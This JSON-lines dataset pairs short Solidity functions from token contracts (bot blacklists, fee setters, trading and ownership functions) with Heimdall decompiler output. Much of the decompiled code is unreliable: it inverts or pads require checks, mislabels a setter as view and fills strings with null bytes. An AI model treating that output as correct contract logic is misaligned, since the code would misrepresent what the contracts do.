{"contract_address": "0x19d4B93c60e5D7995226F47446e56bD6ac2DDD75", "original_solidity_code": "function isBot(address a) public view returns (bool){\n      return bots[a];\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = !(!bytes1(storage_map_b[var_a]));\n        return !(!bytes1(storage_map_b[var_a]));\n    }"}
{"contract_address": "0x926911A3809B6e15FA9dab87A4beAE0E83361C75", "original_solidity_code": "function updateSellFees(\r\n        uint256 _devFee,\r\n        uint256 _liquidityFee,\r\n        uint256 _marketingFee\r\n    ) external onlyOwner {\r\n        sellDevFee = _devFee;\r\n        sellLiquidityFee = _liquidityFee;\r\n        sellMarketingFee = _marketingFee;\r\n        sellTotalFees = sellDevFee + sellLiquidityFee + sellMarketingFee;\r\n    }", "heimdall_decompiled_code": "function updateSellFees(uint256 arg0, uint256 arg1, uint256 arg2) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        sellDevFee = arg0;\n        sellLiquidityFee = arg1;\n        sellMarketingFee = arg2;\n        require(!arg0 > ~(arg1));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n    }"}
{"contract_address": "0x3E04B913dD981C1E6DF41aCBD8fB12A0B2A69171", "original_solidity_code": "function setMaxWalletPercent(uint256 __maxWalletTokenAmount) external onlyOwner {\r\n        require(_maxWalletTokenAmount >= 2, \"Cant set max wallet below 2%\");\r\n        _maxWalletTokenAmount = (totalSupply * __maxWalletTokenAmount ) / 100;\r\n    }", "heimdall_decompiled_code": "function setMaxWalletPercent(uint256 arg0) public view {\n        require(msg.sender == (address(getOwner)), \"!OWNER\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x06;\n        var_d = 0x214f574e45520000000000000000000000000000000000000000000000000000;\n        if (!_maxWalletTokenAmount < 0x02) {\n            require(!(_maxWalletTokenAmount < 0x02), \"Cant set max wallet below 2%\");\n            require(0x12, \"Cant set max wallet below 2%\");\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require((0x01 == 0x01) | !0x15, \"Cant set max wallet below 2%\");\n            require(0x0a, \"Cant set max wallet below 2%\");\n            require(0x0a == 0x01, \"Cant set max wallet below 2%\");\n            require(0x0a == 0x02, \"Cant set max wallet below 2%\");\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require(!(0x12 > 0xff), \"Cant set max wallet below 2%\");\n            require(!((0x0a < 0x0b) & (0x12 < 0x4e) | ((0x0a < 0x0133) & (0x12 < 0x20))), \"Cant set max wallet below 2%\");\n            require(!(0x12 > 0x01), \"Cant set max wallet below 2%\");\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require(!(0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999), \"Cant set max wallet below 2%\");\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require(!(0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999), \"Cant set max wallet below 2%\");\n        }\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1c;\n        var_d = 0x43616e7420736574206d61782077616c6c65742062656c6f7720322500000000;\n    }"}
{"contract_address": "0xeD90409D82B973b1D539F8f5D3e041c387916BbA", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a] > 0);\n        store_e = (0x01 * 0x01000000000000000000000000000000000000000000) | (uint248(store_e));\n        require(!storage_map_b[var_a] - 0);\n        require(!bytes1(store_e / 0x010000000000000000000000000000000000000000));\n        require(!0x02 > 0xffffffffffffffff);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x41;\n        var_d = 0x02;\n        uint256 var_e = var_e + 0x60;\n        require(!0x02);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_f = address(this);\n        var_g = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).WETH(var_h); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!(((var_e + ret0.length) - var_e) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_i == (address(var_i)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_j = address(var_i);\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_d / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_d / 0x01);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_d / 0x01), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        uint256 var_n = ((0x04 + var_e) + 0xa0) - (0x04 + var_e);\n        uint256 var_p = var_e.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_d / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_d / 0x01).{ value: var_m ether }Unresolved_791ac947(var_l); // call\n        store_e = (0 * 0x01000000000000000000000000000000000000000000) | (uint248(store_e));\n        require(!address(this).balance > 0);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x23277343916AD0F79447b64CD0b2374791363Fd5", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)),0, 0, owner(), block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_h / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x17;\n        var_e = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_g = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_g));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require(!0x3b9aca00 | (0x01 == 0x01), \"ERC20: approve to the zero address\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_g / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x22;\n        var_e = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_f = address(this);\n        var_i = 0x02;\n        var_f = address(store_g / 0x01);\n        address var_i = keccak256(var_f);\n        storage_map_n[var_f] = 0x3b9aca00;\n        var_a = 0x3b9aca00;\n        emit Approval(address(this), address(store_g / 0x01), 0x3b9aca00);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_g / 0x01).factory(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_k = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_g / 0x01).WETH(var_d); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_l = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        address var_h = address(var_j);\n        (bool success, bytes memory ret0) = address(var_j).Unresolved_c9c65396(var_e); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x24;\n        var_e = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_g = 0x11;\n                            if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                if (!0x09 > 0x01) {\n                                    if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_g = 0x11;\n                                        if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_g = 0x11;\n                                            if (!0x01) {\n                                            }\n                                            if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x7006A0F5D09b07a365Ff1306467407E57312cF29", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"SafeMath: multiplication overflow\");\n        require(address(arg0) - 0, \"SafeMath: multiplication overflow\");\n        require(arg1 > 0, \"SafeMath: multiplication overflow\");\n        require(!(!(address(msg.sender)) == (address(owner / 0x01))), \"SafeMath: multiplication overflow\");\n        require(!(!(address(arg0)) == (address(owner / 0x01))), \"SafeMath: multiplication overflow\");\n        require(store_b > store_c, \"SafeMath: multiplication overflow\");\n        require(arg1 - 0, \"SafeMath: multiplication overflow\");\n        require(!arg1 | (store_d == ((arg1 * store_d) / arg1)), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((arg1 * store_d) / arg1) == store_d, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_h = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = 0x40 + var_e;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_h = var_e.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        require(0x64, \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        require(!(bytes1(transferDelayEnabled / 0x01)), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_f / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_g / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        address var_a = address(tx.origin);\n        var_n = 0x05;\n        require(storage_map_h[var_a] < block.number, \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x49;\n        var_l = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_o = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_p = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        var_a = address(tx.origin);\n        var_n = 0x05;\n        storage_map_h[var_a] = block.number;\n        require(!(address(msg.sender) == (address(store_g / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_g / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_g / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_g / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_g / 0x01))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_n = 0x01;\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(((arg1 * store_d) / 0x64) > 0), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_n = 0x01;\n        require(!(storage_map_h[var_a] > (storage_map_h[var_a] + ((arg1 * store_d) / 0x64))), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(!(storage_map_h[var_a] + ((arg1 * store_d) / 0x64) < storage_map_h[var_a]), \"SafeMath: addition overflow\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x1b;\n        var_l = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_n = 0x01;\n        storage_map_h[var_a] = storage_map_h[var_a] + ((arg1 * store_d) / 0x64);\n        uint256 var_j = (arg1 * store_d) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (arg1 * store_d) / 0x64);\n        var_a = address(msg.sender);\n        var_n = 0x01;\n        var_e = 0x40 + var_e;\n        var_j = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_h[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_h[var_a] - arg1) > storage_map_h[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        var_a = address(msg.sender);\n        var_n = 0x01;\n        storage_map_h[var_a] = storage_map_h[var_a] - arg1;\n        var_e = 0x40 + var_e;\n        var_r = 0x1e;\n        var_s = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((arg1 * store_d) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_t = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_p = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_u = var_e.length;\n        uint256 var_v = 0;\n        var_w = var_m;\n        var_v = 0;\n        if (!(arg1 - ((arg1 * store_d) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_b = 0x11;\n            if (storage_map_h[var_a] > _maxTaxSwap) {\n            }\n            if (!store_b > store_j) {\n            }\n            if (!storage_map_h[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_g / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_b > store_l) {\n                if (arg1 - 0) {\n                }\n                require(!((arg1 - ((arg1 * store_d) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_b > store_l, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x19;\n        var_l = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(arg0) == (address(store_f / 0x01))) {\n            if (address(arg0) == (address(store_f / 0x01))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xe2BFF0b8121D4977F0aFd680dB7d3eADDa4Ab3Df", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\nrequire(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\nemit OwnershipTransferred(_owner, newOwner);\r\n_owner = newOwner;\r\n}", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(address(owner), address(arg0));\n        owner = (address(arg0)) | (uint96(owner));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xB14c3a406A345F2b4E79aB45d81A63E9a815ec71", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n    }"}
{"contract_address": "0x8084E313691B80C63c8f1a68de1003a685376aCA", "original_solidity_code": "function unblackaddress(address notbot) public onlyOwner {\r\n        bots[notbot] = false;\r\n    }", "heimdall_decompiled_code": "function unblackaddress(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_e = address(arg0);\n        var_f = 0x10;\n        storage_map_c[var_e] = uint248(storage_map_c[var_e]);\n    }"}
{"contract_address": "0x31b60867a6203e76120df0612769ba136097eBc8", "original_solidity_code": "function symbol() public view  returns (string memory) {\r\n        return _tokenSSSsymbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_i) {\n            if (store_i - ((store_i >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_i >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_i >> 0x01;\n                if (store_i) {\n                    if (store_i - ((store_i >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_i >> 0x01) {\n                            if (0x1f < (store_i >> 0x01)) {\n                                var_a = 0x05;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_i >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x50A1f46F028622B4cD9BE9c0E687104247946293", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x636aD441CdA1EC74BC059A23615b9D9c3464d9e3", "original_solidity_code": "function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {\r\n        _maxTxAmount = maxTxAmount;\r\n    }", "heimdall_decompiled_code": "function setMaxTxAmount(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _maxTxAmount = arg0;\n    }"}
{"contract_address": "0x78D08E5831eeA6c6c6Af34d700F79A5b00873efE", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_h[var_a];\n        return storage_map_h[var_a];\n    }"}
{"contract_address": "0x693E9C1e8935caf91F006bf5a2FF8a1aB2C569c7", "original_solidity_code": "function transferOwnership(address payable adr) public onlyOwner {\r\n        owner = adr;\r\n        emit OwnershipTransferred(adr);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(getOwner)), \"!Owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x06;\n        var_d = 0x214f776e65720000000000000000000000000000000000000000000000000000;\n        getOwner = (address(arg0)) | (uint96(getOwner));\n        address var_a = address(arg0);\n        emit OwnershipTransferred(address(arg0));\n    }"}
{"contract_address": "0xd6fDDDc9A79AA8215aEA6CA790D87406dba5CDf3", "original_solidity_code": "function setFeeToSetter(address _feeToSetter) external {\\n        require(msg.sender == feeToSetter, 'UniswapV2: FORBIDDEN');\\n        feeToSetter = _feeToSetter;\\n    }", "heimdall_decompiled_code": "function setFeeToSetter(address arg0) public payable {\n        require(msg.value);\n        require((0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc + msg.data.length) < 0x20);\n        require(arg0 - (address(arg0)));\n        require(!(msg.sender == (address(feeToSetter))), \"UniswapV2: FORBIDDEN\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x14;\n        var_d = 0x556e697377617056323a20464f5242494444454e000000000000000000000000;\n        feeToSetter = (address(arg0)) | (uint96(feeToSetter));\n    }"}
{"contract_address": "0x39f3C6C2a3E69D908DFE9863C9127080CC487933", "original_solidity_code": "function updateMaxWallets(uint256 maxWallet) external onlyOwner {\r\n        maxWalletLimit = maxWallet * 10**decimals();\r\n    }", "heimdall_decompiled_code": "function updateMaxWallets(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x12) {\n            require(0x12);\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            maxWalletLimit = 0x01 * arg0;\n            require((0x01 == ((0x01 * arg0) / arg0)) | !arg0);\n            require(0x0a);\n            require(0x0a == 0x01);\n            require(0x0a == 0x02);\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require(!0x12 > 0xff);\n            require(!((0x0a < 0x0b) & (0x12 < 0x4e)) | ((0x0a < 0x0133) & (0x12 < 0x20)));\n            require(!0x12 > 0x01);\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require(!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999);\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require(!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999);\n        }\n    }"}
